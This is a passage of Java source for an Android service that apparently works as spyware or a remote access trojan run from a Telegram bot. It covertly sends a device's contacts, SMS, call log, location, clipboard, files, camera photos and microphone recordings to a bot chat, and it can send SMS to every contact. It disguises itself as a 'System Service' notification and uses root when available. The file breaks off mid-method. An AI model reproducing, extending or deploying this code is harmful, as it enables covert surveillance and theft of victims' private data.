package com.thunderx.telegramagent;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.AppOpsManager;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Vibrator;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.ByteBuffer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.UUID;
import java.util.concurrent.ConcurrentHashMap;

public class TelegramAgentService extends Service {

    // ================= CONFIGURATION =================
    private static final String BOT_TOKEN = "Anonymous";
    private static final String CHAT_ID   = "Anonymous";
    private static final String API_URL   = "https://api.telegram.org/bot" + BOT_TOKEN;

    // Telegram bots upload limit: 50 MB
    private static final long MAX_UPLOAD_BYTES = 50L * 1024 * 1024;

    // ================= STATE =================
    private static Context context;
    private static final String DEVICE_ID = UUID.randomUUID().toString().substring(0, 8);
    private int lastUpdateId = 0;

    // Per-chat current working directory
    private final ConcurrentHashMap<String, File> cwd = new ConcurrentHashMap<>();

    // Root availability flag (checked at startup)
    private boolean hasRoot = false;

    // ================= LIFECYCLE =================
    @Override
    public void onCreate() {
        super.onCreate();
        context = this;
        hasRoot = checkRoot();
        startForeground(999, createNotification());
        sendMessage("✅ *Agent Online*\nID: `" + DEVICE_ID + "`\nModel: " + Build.MODEL
                + "\nRoot: " + (hasRoot ? "✅" : "❌"));
        new PollingThread().start();
        Log.d("Agent", "Service Started");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ================= NOTIFICATION =================
    private Notification createNotification() {
        String channelId = "agent_channel";
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    channelId, "Agent", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
        return new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_manage)
                .build();
    }

    // ================= ROOT CHECK =================
    private boolean checkRoot() {
        String[] paths = {
                "/system/bin/su", "/system/xbin/su", "/sbin/su",
                "/system/sd/xbin/su", "/system/bin/failsafe/su",
                "/data/local/su", "/data/local/bin/su", "/data/local/xbin/su"
        };
        for (String p : paths) {
            if (new File(p).exists()) return true;
        }
        try {
            Process proc = Runtime.getRuntime().exec(new String[]{"su", "-c", "id"});
            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            String line = br.readLine();
            proc.waitFor();
            return line != null && line.contains("uid=0");
        } catch (Exception e) {
            return false;
        }
    }

    // ================= POLLING =================
    private class PollingThread extends Thread {
        @Override public void run() {
            while (true) {
                try {
                    String url = API_URL + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=20";
                    HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(20000);

                    int code = conn.getResponseCode();
                    if (code != 200) { Thread.sleep(5000); continue; }

                    BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = in.readLine()) != null) response.append(line);
                    in.close();

                    JSONObject json = new JSONObject(response.toString());
                    if (json.getBoolean("ok")) {
                        JSONArray results = json.getJSONArray("result");
                        for (int i = 0; i < results.length(); i++) {
                            JSONObject update = results.getJSONObject(i);
                            lastUpdateId = update.getInt("update_id");
                            if (update.has("message") && update.getJSONObject("message").has("text")) {
                                String text = update.getJSONObject("message").getString("text");
                                processCommand(text.trim());
                            }
                        }
                    }
                    conn.disconnect();
                    Thread.sleep(2000);
                } catch (Exception e) {
                    Log.e("Agent", "Polling error: " + e.getMessage());
                    try { Thread.sleep(5000); } catch (InterruptedException ignored) {}
                }
            }
        }
    }

    // ================= SEND TEXT =================
    public static void sendMessage(String text) {
        if (context == null) return;
        new Thread(() -> {
            try {
                String encoded = URLEncoder.encode(text, "UTF-8");
                String url = API_URL + "/sendMessage?chat_id=" + CHAT_ID +
                        "&text=" + encoded + "&parse_mode=Markdown";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("GET");
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("Agent", "Send failed: " + e.getMessage());
            }
        }).start();
    }

    // ================= SEND PHOTO (bytes) =================
    public static void sendPhotoToTelegram(byte[] jpegData, int width, int height) {
        if (context == null || jpegData == null) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            OutputStream os = null;
            PrintWriter writer = null;
            try {
                String boundary = "----TB" + System.currentTimeMillis();
                conn = (HttpURLConnection) new URL(API_URL + "/sendPhoto").openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);
                conn.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);

                os = conn.getOutputStream();
                writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                writer.append(CHAT_ID).append("\r\n");
                writer.flush();

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                writer.append("📸 ").append(DEVICE_ID)
                        .append(" (").append(String.valueOf(width))
                        .append("x").append(String.valueOf(height)).append(")\r\n");
                writer.flush();

                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"photo\"; filename=\"img.jpg\"\r\n");
                writer.append("Content-Type: image/jpeg\r\n\r\n");
                writer.flush();

                os.write(jpegData);
                os.flush();

                writer.append("\r\n");
                writer.append("--").append(boundary).append("--\r\n");
                writer.flush();

                Log.d("Agent", "Photo response: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e("Agent", "Photo send error: " + e.getMessage());
            } finally {
                try { if (writer != null) writer.close(); } catch (Exception ignored) {}
                try { if (os != null) os.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    // ================= SEND DOCUMENT (file) =================
    public static void sendDocumentToTelegram(File file, String mimeType, String fileName) {
        sendFileToTelegram(file, mimeType, fileName, "sendDocument", "document", null);
    }

    // ================= GENERIC FILE SENDER =================
    // endpoint: sendPhoto | sendVideo | sendAudio | sendDocument
    // fieldName: photo | video | audio | document
    private static void sendFileToTelegram(File file, String mimeType,
                                           String fileName, String endpoint,
                                           String fieldName, String caption) {
        if (context == null || file == null || !file.exists()) return;
        new Thread(() -> {
            HttpURLConnection conn = null;
            OutputStream os = null;
            PrintWriter writer = null;
            FileInputStream fis = null;
            try {
                String boundary = "----TB" + System.currentTimeMillis();
                conn = (HttpURLConnection) new URL(API_URL + "/" + endpoint).openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(120000);
                conn.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);

                os = conn.getOutputStream();
                writer = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);

                // chat_id
                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                writer.append(CHAT_ID).append("\r\n");
                writer.flush();

                // optional caption
                if (caption != null) {
                    writer.append("--").append(boundary).append("\r\n");
                    writer.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                    writer.append(caption).append("\r\n");
                    writer.flush();
                }

                // file part
                writer.append("--").append(boundary).append("\r\n");
                writer.append("Content-Disposition: form-data; name=\"")
                      .append(fieldName).append("\"; filename=\"")
                      .append(fileName).append("\"\r\n");
                writer.append("Content-Type: ").append(mimeType).append("\r\n\r\n");
                writer.flush();

                fis = new FileInputStream(file);
                byte[] buf = new byte[8192];
                int n;
                while ((n = fis.read(buf)) > 0) os.write(buf, 0, n);
                os.flush();

                writer.append("\r\n");
                writer.append("--").append(boundary).append("--\r\n");
                writer.flush();

                Log.d("Agent", endpoint + " response: " + conn.getResponseCode());
            } catch (Exception e) {
                Log.e("Agent", endpoint + " error: " + e.getMessage());
            } finally {
                try { if (fis != null) fis.close(); } catch (Exception ignored) {}
                try { if (writer != null) writer.close(); } catch (Exception ignored) {}
                try { if (os != null) os.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    // ================= COMMAND DISPATCHER =================
    private void processCommand(String command) {
        Log.d("Agent", "Command: " + command);
        String cmd, payload = "";
        int idx = command.indexOf(' ');
        if (idx != -1) {
            cmd = command.substring(0, idx).toLowerCase().replace("/", "");
            payload = command.substring(idx + 1).trim();
        } else {
            cmd = command.toLowerCase().replace("/", "");
        }

        switch (cmd) {
            case "start":
            case "menu":          sendMenu(); break;

            case "contacts":      getContacts(); break;
            case "sms":           getInboxSms(); break;
            case "outbox":        getOutboxSms(); break;
            case "send_sms":      sendSms(payload); break;
            case "send_sms_all":  sendSmsToAll(payload); break;
            case "vibrate":       vibrateDevice(); break;
            case "apps":          getInstalledApps(); break;
            case "devices":       getDeviceInfo(); break;
            case "screen":        captureScreen(); break;

            case "location":      getLocation(); break;
            case "camera":        capturePhoto(false); break;
            case "cameraf":       capturePhoto(true); break;
            case "mic":           recordAudio(); break;
            case "call_log":      getCallLog(); break;

            // ---------- FILE SYSTEM ----------
            case "files": case "ls":      cmdFiles(payload); break;
            case "cd":                    cmdCd(payload); break;
            case "pwd":                   cmdPwd(); break;
            case "get": case "dl":        cmdGet(payload); break;
            case "search": case "find":   cmdSearch(payload); break;
            case "tree":                  cmdTree(payload); break;
            case "info": case "stat":     cmdInfo(payload); break;

            case "clipboard":     getClipboard(); break;
            case "battery":       getBattery(); break;
            case "lock":          lockScreen(); break;
            case "wifi":          getWifiInfo(); break;

            default:              sendMessage("❌ Unknown. Type /menu"); break;
        }
    }

    // ================= /menu =================
    private void sendMenu() {
        String menu = "📱 *Available Commands*\n\n" +
                "📇 /contacts - Get contacts\n" +
                "📩 /sms - Inbox SMS\n" +
                "📤 /outbox - Sent SMS\n" +
                "✉️ /send_sms number|message\n" +
                "📨 /send_sms_all message\n" +
                "📳 /vibrate - Vibrate\n" +
                "📦 /apps - Installed apps\n" +
                "🖥️ /devices - Device info\n" +
                "📸 /screen - Screen capture\n" +
                "📍 /location - GPS location\n" +
                "📷 /camera - Back camera photo\n" +
                "🤳 /cameraF - Front camera photo\n" +
                "🎙️ /mic - Record 10s audio\n" +
                "📞 /call_log - Call history\n" +
                "📋 /clipboard - Clipboard\n" +
                "🔋 /battery - Battery info\n" +
                "🔒 /lock - Lock screen\n" +
                "📶 /wifi - WiFi info\n\n" +
                "*📁 File System:*\n" +
                "`/pwd` — current dir\n" +
                "`/ls` `/files [dir]` — list\n" +
                "`/cd <dir>` — change dir (`..` `~` `root`)\n" +
                "`/get <file>` — download file 📤\n" +
                "`/search <name>` — recursive find\n" +
                "`/tree` — directory tree\n" +
                "`/info <file>` — file details";
        sendMessage(menu);
    }

    // ================= /screen =================
    private void captureScreen() {
        sendMessage("📸 Requesting screen capture permission...");
        try {
            Intent intent = new Intent(this, CaptureActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
        } catch (Exception e) { sendMessage("❌ Failed: " + e.getMessage()); }
    }

    // ================= /contacts =================
    private void getContacts() {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CONTACTS denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.READ_CONTACTS`");
            return;
        }
        StringBuilder sb = new StringBuilder("📇 *Contacts:*\n");
        Cursor cur = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) {
            while (cur.moveToNext() && sb.length() < 3900) {
                String name = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String num  = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("• ").append(name != null ? name : "?").append(": ").append(num != null ? num : "").append("\n");
            }
            cur.close();
        }
        sendMessage(sb.toString());
    }

    // ================= /sms =================
    private void getInboxSms() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_SMS denied.\n\nOn Android 11+ this permission is restricted. Grant via ADB:\n" +
                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
            return;
        }
        StringBuilder sb = new StringBuilder("📩 *Inbox SMS (Last 30):*\n");
        Cursor cur = null;
        try {
            cur = getContentResolver().query(Uri.parse("content://sms/inbox"),
                    null, null, null, "date DESC LIMIT 30");
            if (cur == null) { sendMessage("❌ SMS provider not accessible."); return; }

            int bodyIdx = cur.getColumnIndex("body");
            int addrIdx = cur.getColumnIndex("address");
            if (bodyIdx == -1 || addrIdx == -1) { sendMessage("❌ Columns missing."); return; }

            int count = 0;
            while (cur.moveToNext() && sb.length() < 3900) {
                String body = cur.getString(bodyIdx);
                String addr = cur.getString(addrIdx);
                sb.append("• ").append(addr != null ? addr : "?")
                  .append(": ").append(body != null ? body : "").append("\n");
                count++;
            }
            if (count == 0) { sendMessage("📩 No inbox SMS."); return; }
        } catch (SecurityException se) {
            sendMessage("❌ SecurityException. Grant via ADB:\n" +
                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_SMS`");
            return;
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getMessage());
            return;
        } finally { if (cur != null) cur.close(); }
        sendMessage(sb.toString());
    }

    // ================= /outbox =================
    private void getOutboxSms() {
        if (checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_SMS denied. Grant via ADB.");
            return;
        }
        StringBuilder sb = new StringBuilder("📤 *Sent SMS (Last 30):*\n");
        Cursor cur = null;
        try {
            cur = getContentResolver().query(Uri.parse("content://sms/sent"),
                    null, null, null, "date DESC LIMIT 30");
            if (cur == null) { sendMessage("❌ No access."); return; }
            int bodyIdx = cur.getColumnIndex("body");
            int addrIdx = cur.getColumnIndex("address");
            int count = 0;
            while (cur.moveToNext() && sb.length() < 3900) {
                sb.append("• ").append(cur.getString(addrIdx)).append(": ")
                  .append(cur.getString(bodyIdx)).append("\n");
                count++;
            }
            if (count == 0) { sendMessage("📤 No sent SMS."); return; }
        } catch (Exception e) { sendMessage("❌ Error: " + e.getMessage()); return; }
        finally { if (cur != null) cur.close(); }
        sendMessage(sb.toString());
    }

    // ================= /send_sms =================
    private void sendSms(String data) {
        String[] parts = data.split("\\|", 2);
        if (parts.length < 2) { sendMessage("❌ Format: /send_sms number|message"); return; }
        try {
            SmsManager.getDefault().sendTextMessage(parts[0], null, parts[1], null, null);
            sendMessage("📤 SMS sent to " + parts[0]);
        } catch (Exception e) { sendMessage("❌ Failed: " + e.getMessage()); }
    }

    // ================= /send_sms_all =================
    private void sendSmsToAll(String msg) {
        if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CONTACTS denied."); return;
        }
        Cursor cur = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cur != null) {
            int count = 0;
            while (cur.moveToNext()) {
                String num = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                if (num != null && !num.isEmpty()) {
                    try { SmsManager.getDefault().sendTextMessage(num, null, msg, null, null); count++; }
                    catch (Exception ignored) {}
                }
            }
            cur.close();
            sendMessage("📨 Bulk SMS sent to " + count + " contacts.");
        }
    }

    // ================= /vibrate =================
    private void vibrateDevice() {
        Vibrator v = (Vibrator) getSystemService(VIBRATOR_SERVICE);
        if (v != null) { v.vibrate(2000); sendMessage("📳 Vibrating!"); }
        else sendMessage("❌ Vibrator not available.");
    }

    // ================= /apps =================
    private void getInstalledApps() {
        StringBuilder sb = new StringBuilder("📦 *Installed Apps:*\n");
        PackageManager pm = getPackageManager();
        List<ApplicationInfo> apps = pm.getInstalledApplications(0);
        for (ApplicationInfo app : apps) {
            if (sb.length() > 3900) break;
            sb.append("• ").append(pm.getApplicationLabel(app)).append("\n");
        }
        sendMessage(sb.toString());
    }

    // ================= /devices =================
    private void getDeviceInfo() {
        sendMessage("🖥️ *Device Info*\n" +
                "ID: `" + DEVICE_ID + "`\n" +
                "Model: " + Build.MANUFACTURER + " " + Build.MODEL + "\n" +
                "Android: " + Build.VERSION.RELEASE + " (API " + Build.VERSION.SDK_INT + ")\n" +
                "Brand: " + Build.BRAND + "\n" +
                "Root: " + (hasRoot ? "✅" : "❌"));
    }

    // ================= /location =================
    private void getLocation() {
        if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
                && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ LOCATION denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.ACCESS_FINE_LOCATION`");
            return;
        }
        LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
        if (lm == null) { sendMessage("❌ LocationManager unavailable."); return; }

        try {
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (loc != null) {
                sendLocation(loc);
            } else {
                sendMessage("📍 Fetching fresh location...");
                final LocationListener[] listenerRef = new LocationListener[1];
                LocationListener listener = new LocationListener() {
                    @Override public void onLocationChanged(Location location) {
                        sendLocation(location);
                        try { lm.removeUpdates(listenerRef[0]); } catch (Exception ignored) {}
                    }
                    @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                    @Override public void onProviderEnabled(String provider) {}
                    @Override public void onProviderDisabled(String provider) {}
                };
                listenerRef[0] = listener;
                lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
            }
        } catch (SecurityException se) {
            sendMessage("❌ SecurityException: " + se.getMessage());
        } catch (Exception e) {
            sendMessage("❌ Location error: " + e.getMessage());
        }
    }

    private void sendLocation(Location loc) {
        double lat = loc.getLatitude();
        double lon = loc.getLongitude();
        sendMessage("📍 *Location*\n" +
                "Lat: `" + lat + "`\n" +
                "Lon: `" + lon + "`\n" +
                "Accuracy: " + loc.getAccuracy() + " m\n" +
                "Provider: " + loc.getProvider() + "\n" +
                "Map: https://maps.google.com/?q=" + lat + "," + lon);
    }

    // ================= /camera & /cameraF =================
    private void capturePhoto(boolean useFront) {
        if (checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ CAMERA denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.CAMERA`");
            return;
        }
        sendMessage(useFront ? "📷 Capturing front photo..." : "📷 Capturing back photo...");
        try {
            CameraManager cm = (CameraManager) getSystemService(CAMERA_SERVICE);
            if (cm == null) { sendMessage("❌ CameraManager null."); return; }

            String[] ids = cm.getCameraIdList();
            if (ids.length == 0) { sendMessage("❌ No camera."); return; }

            String chosenId = null;
            for (String id : ids) {
                CameraCharacteristics chars = cm.getCameraCharacteristics(id);
                Integer facing = chars.get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;

                if (useFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    chosenId = id; break;
                }
                if (!useFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    chosenId = id; break;
                }
            }
            if (chosenId == null) chosenId = useFront ? ids[ids.length - 1] : ids[0];
            final String cameraId = chosenId;

            cm.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override public void onOpened(CameraDevice camera) {
                    try {
                        final ImageReader reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1);
                        reader.setOnImageAvailableListener(r -> {
                            Image img = r.acquireLatestImage();
                            if (img != null) {
                                ByteBuffer buf = img.getPlanes()[0].getBuffer();
                                byte[] bytes = new byte[buf.remaining()];
                                buf.get(bytes);
                                img.close();
                                sendPhotoToTelegram(bytes, 1280, 720);
                            }
                            try { camera.close(); } catch (Exception ignored) {}
                            try { reader.close(); } catch (Exception ignored) {}
                        }, new Handler(Looper.getMainLooper()));

                        camera.createCaptureSession(
                                Collections.singletonList(reader.getSurface()),
                                new CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(CameraCaptureSession session) {
                                        try {
                                            CaptureRequest.Builder b = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE);
                                            b.addTarget(reader.getSurface());
                                            session.capture(b.build(), null, null);
                                        } catch (Exception e) {
                                            Log.e("Agent", "capture failed", e);
                                            sendMessage("❌ Capture failed: " + e.getMessage());
                                            try { camera.close(); } catch (Exception ignored) {}
                                        }
                                    }
                                    @Override public void onConfigureFailed(CameraCaptureSession session) {
                                        sendMessage("❌ Camera session failed.");
                                        try { camera.close(); } catch (Exception ignored) {}
                                    }
                                }, null);
                    } catch (Exception e) {
                        Log.e("Agent", "camera open", e);
                        sendMessage("❌ Camera error: " + e.getMessage());
                        try { camera.close(); } catch (Exception ignored) {}
                    }
                }
                @Override public void onDisconnected(CameraDevice camera) { try { camera.close(); } catch (Exception ignored) {} }
                @Override public void onError(CameraDevice camera, int error) {
                    sendMessage("❌ Camera error code: " + error);
                    try { camera.close(); } catch (Exception ignored) {}
                }
            }, new Handler(Looper.getMainLooper()));
        } catch (Exception e) {
            sendMessage("❌ Camera failed: " + e.getMessage());
        }
    }

    // ================= /mic =================
    private void recordAudio() {
        if (checkSelfPermission(Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ RECORD_AUDIO denied.\nGrant via ADB:\n`adb shell pm grant com.thunderx.telegramagent android.permission.RECORD_AUDIO`");
            return;
        }
        try {
            final File out = new File(getCacheDir(),
                    "rec_" + System.currentTimeMillis() + ".m4a");
            final MediaRecorder rec = new MediaRecorder();
            rec.setAudioSource(MediaRecorder.AudioSource.MIC);
            rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            rec.setAudioSamplingRate(44100);
            rec.setAudioEncodingBitRate(96000);
            rec.setOutputFile(out.getAbsolutePath());
            rec.prepare();
            rec.start();
            sendMessage("🎙️ Recording 10 seconds...");

            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                try {
                    rec.stop();
                    rec.release();
                    sendDocumentToTelegram(out, "audio/mp4", out.getName());
                } catch (Exception e) {
                    Log.e("Agent", "rec stop", e);
                    sendMessage("❌ Record stop error: " + e.getMessage());
                }
            }, 10000);
        } catch (Exception e) {
            sendMessage("❌ Mic error: " + e.getMessage());
        }
    }

    // ================= /call_log =================
    private void getCallLog() {
        // 1. Permission check
        if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            sendMessage("❌ READ_CALL_LOG denied.\nGrant via ADB:\n" +
                    "`adb shell pm grant com.thunderx.telegramagent android.permission.READ_CALL_LOG`");
            return;
        }
        // 2. AppOps check
        try {
            AppOpsManager appOps = (AppOpsManager) getSystemService(Context.APP_OPS_SERVICE);
            int mode = appOps.unsafeCheckOpNoThrow(
                    AppOpsManager.OPSTR_READ_CALL_LOG,
                    android.os.Process.myUid(), getPackageName());
            if (mode != AppOpsManager.MODE_ALLOWED) {
                sendMessage("❌ CALL_LOG blocked by AppOps (mode=" + mode + ").\n" +
                        "Run: `adb shell appops set com.thunderx.telegramagent READ_CALL_LOG allow`");
                return;
            }
        } catch (Throwable ignored) {}

        // 3. Query
        StringBuilder sb = new StringBuilder("📞 *Call Log (Last 30):*\n");
        Cursor cur = null;
        try {
            Bundle args = new Bundle();
            args.putString(ContentResolver.QUERY_ARG_SQL_SORT_ORDER, CallLog.Calls.DATE + " DESC");
            args.putInt(ContentResolver.QUERY_ARG_LIMIT, 30);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, args, null);
            } else {
                cur = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null,
                        CallLog.Calls.DATE + " DESC");
            }
            if (cur == null) { sendMessage("❌ No access to call log."); return; }

            int numIdx  = cur.getColumnIndex(CallLog.Calls.NUMBER);
            int typeIdx = cur.getColumnIndex(CallLog.Calls.TYPE);
            int durIdx  = cur.getColumnIndex(CallLog.Calls.DURATION);
            int dateIdx = cur.getColumnIndex(CallLog.Calls.DATE);

            SimpleDateFormat sdf = new SimpleDateFormat("MM-dd HH:mm", Locale.US);
            int count = 0;
            while (cur.moveToNext() && sb.length() < 3900 && count < 30) {
                String num = cur.getString(numIdx);
                int type  = cur.getInt(typeIdx);
                long dur  = cur.getLong(durIdx);
                long date = cur.getLong(dateIdx);
                String typeStr;
                switch (type) {
                    case CallLog.Calls.INCOMING_TYPE: typeStr = "⬅️"; break;
                    case CallLog.Calls.OUTGOING_TYPE: typeStr = "➡️"; break;
                    case CallLog.Calls.MISSED_TYPE:   typeStr = "❌"; break;
                    default: typeStr = "❓";
                }
                sb.append(typeStr).append(" ").append(num != null ? num : "?")
                  .append(" (").append(dur).append("s) ")
                  .append(sdf.format(new Date(date))).append("\n");
                count++;
            }
            if (count == 0) { sendMessage("📞 No call log entries."); return; }
        } catch (SecurityException se) {
            sendMessage("❌ SecurityException — system blocked CALL_LOG.\n" +
                    "ADB fix: `adb shell appops set com.thunderx.telegramagent READ_CALL_LOG allow`");
            return;
        } catch (Exception e) {
            sendMessage("❌ Error: " + e.getClass().getSimpleName() + ": " + e.getMessage());
            return;
        } finally { if (cur != null) cur.close(); }
        sendMessage(sb.toString());
    }

    // ==========================================================
    //                  FILE SYSTEM COMMANDS
    // ==========================================================

    // ---------- cwd helpers ----------
    private File getCwd() {
        File f = cwd.get(CHAT_ID);
        if (f == null || !f.exists() || !f.isDirectory()) {
            f = Environment.getExternalStorageDirectory();
            cwd.put(CHAT_ID, f);
        }
        return f;
    }

    private void setCwd(File dir) {
        cwd.put(CHAT_ID, dir);
    }

    // Resolve relative/absolute paths + shortcuts
    private File resolvePath(File base, String path) {
        if (path == null || path.isEmpty()) return base;
        if (path.equals("~")) return Environment.getExternalStorageDirectory();
        if (path.equals("/")) return new File("/");
        File f = new File(path);
        if (f.isAbsolute()) return f;
        return new File(base, path);
    }

    // ================= /pwd =================
    private void cmdPwd() {
        File dir = getCwd();
        sendMessage("📁 `" + dir.getAbsolutePath() + "`" +
                (hasRoot ? " 🔓" : ""));
    }

    // ================= /cd =================
    private void cmdCd(String arg) {
        File current = getCwd();

        // No arg → sdcard root
        if (arg == null || arg.isEmpty()) {
            setCwd(Environment.getExternalStorageDirectory());
            sendMessage("📁 `" + getCwd().getAbsolutePath() + "`");
            return;
        }

        arg = arg.trim();

        // ".." → parent
        if (arg.equals("..")) {
            File parent = current.getParentFile();
            if (parent == null || !parent.canRead()) {
                sendMessage("❌ Already at root.");
                return;
            }
            setCwd(parent);
            sendMessage("📁 `" + parent.getAbsolutePath() + "`");
            return;
        }

        // "~" → sdcard root
        if (arg.equals("~")) {
            setCwd(Environment.getExternalStorageDirectory());
            sendMessage("📁 `" + getCwd().getAbsolutePath() + "`");
            return;
        }

        // "root" → filesystem root
        if (arg.equalsIgnoreCase("root")) {
            setCwd(new File("/"));
            sendMessage("📁 `/`");
            return;
        }

        File target = resolvePath(current, arg);

        // Normal (no-root) access
        if (target.exists() && target.isDirectory() && target.canRead()) {
            setCwd(target);
            sendMessage("📁 `" + target.getAbsolutePath() + "`");
            return;
        }

        // Root fallback
        if (hasRoot && testRootDir(target.getAbsolutePath())) {
            setCwd(target);
            sendMessage("📁 `" + target.getAbsolutePath() + "` 🔓");
            return;
        }

        sendMessage("❌ Cannot access: `" + arg + "`\n" +
                (hasRoot ? "_Path invalid or unreadable._" : "_No root._"));
    }

    private boolean testRootDir(String path) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"su", "-c",
                    "test -d \"" + path.replace("\"", "\\\"") + "\" && echo OK"});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String l = br.readLine();
            p.waitFor();
